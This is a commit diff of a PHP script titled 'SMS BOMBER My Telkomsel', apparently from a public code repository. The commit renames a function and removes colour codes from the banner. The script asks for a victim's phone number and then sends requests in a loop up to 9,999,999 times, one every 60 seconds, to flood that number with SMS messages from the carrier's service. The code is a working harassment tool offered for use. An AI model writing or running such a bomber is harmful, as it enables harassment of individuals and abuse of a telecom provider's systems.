94aabb5f2767febfb37b88bdc2b559273e833c0b
hilminurhadi <35126818+hilminurhadi@users.noreply.github.com>
2018-01-05 13:46:45 +0700

    Update test.php

--- test.php
+++ test.php
@@ -1,5 +1,5 @@
 <?php
-function telkbomb($no, $jum, $wait){
+function mytsel($no, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
@@ -11,20 +11,20 @@ function telkbomb($no, $jum, $wait){
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
         $server_output = curl_exec ($ch);
         curl_close ($ch);
-        echo $server_output."\n[#008000]Delay: 60 Second\n";
+        echo $server_output."\n=====Delay: 60 Second=====\n";
         sleep($wait);
         $x++;
         flush();
     }
 }
-print "\n\n[#FF0000]SMS BOMBER My Telkomsel\n";
-print "[#1E90FF]Unlimited\n";
-print "[#008000]Koe Nurf\n\n\n";
+print "\n\nSMS BOMBER My Telkomsel\n";
+print "Unlimited\n";
+print "Koe Nurf\n\n\n";
 
 echo "Nomor (eg : 628xxx)\nInput : ";
 $nomor = trim(fgets(STDIN));
 $jumlah = "9999999";
 $jeda = "60";
-$execute = telkbomb($nomor, $jumlah, $jeda);
+$execute = mytsel($nomor, $jumlah, $jeda);
 print $execute;
 ?>
